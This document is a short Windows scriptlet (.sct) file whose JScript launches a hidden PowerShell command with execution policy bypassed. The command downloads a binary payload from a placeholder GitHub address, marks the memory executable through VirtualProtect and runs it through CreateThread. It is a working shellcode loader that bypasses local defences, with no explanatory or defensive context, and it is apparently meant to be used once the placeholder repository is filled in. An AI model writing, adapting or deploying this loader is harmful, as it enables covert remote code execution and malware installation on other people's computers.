<?XML version="1.0"?>
<scriptlet>
<registration progid="Run" classid="{00000000-0000-0000-0000-000000000001}">
<script language="JScript">
<![CDATA[
var shell = new ActiveXObject("WScript.Shell");
var cmd = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$sc=$wc.DownloadData(\'https://raw.githubusercontent.com/YOUR-USERNAME/YOUR-REPO/main/payload.bin\');$va=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);[Runtime.InteropServices.Marshal]::Copy($sc,0,$va,$sc.Length);$vp=Add-Type -M \'[DllImport(\\\"kernel32.dll\\\")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\' -N K -Namespace W -PassThru;$o=0;[void]$vp::VirtualProtect($va,$sc.Length,0x40,[ref]$o);$ct=Add-Type -M \'[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,ref IntPtr t);\' -N T -Namespace W -PassThru;$t=0;[void]$ct::CreateThread(0,0,$va,0,0,[ref]$t);Sleep 999"';
shell.Run(cmd, 0, false);
]]>
</script>
</registration>
</scriptlet>
